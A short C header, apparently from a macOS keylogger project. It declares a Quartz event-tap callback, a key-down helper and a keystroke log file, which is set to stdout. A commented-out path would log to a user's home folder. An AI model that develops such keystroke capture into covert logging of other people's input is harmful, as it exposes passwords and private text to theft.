#ifndef __KEYLOGGER_H__
#define __KEYLOGGER_H__

#include <ApplicationServices/ApplicationServices.h>
#include <Carbon/Carbon.h>
#include <stdbool.h>
#include <stdio.h>
#include <string.h>
#include <time.h>
// https://developer.apple.com/library/mac/documentation/Carbon/Reference/QuartzEventServicesRef/Reference/reference.html

FILE *logfile = NULL;
// const char *logfileLocation = "/Users/khang/files/keystroke.log";
const char *logfileLocation = "/dev/stdout";

CGEventRef CGEventCallback(CGEventTapProxy, CGEventType, CGEventRef, void *);
bool isKeyDown(CGEventType, CGEventFlags, CGKeyCode);

#endif
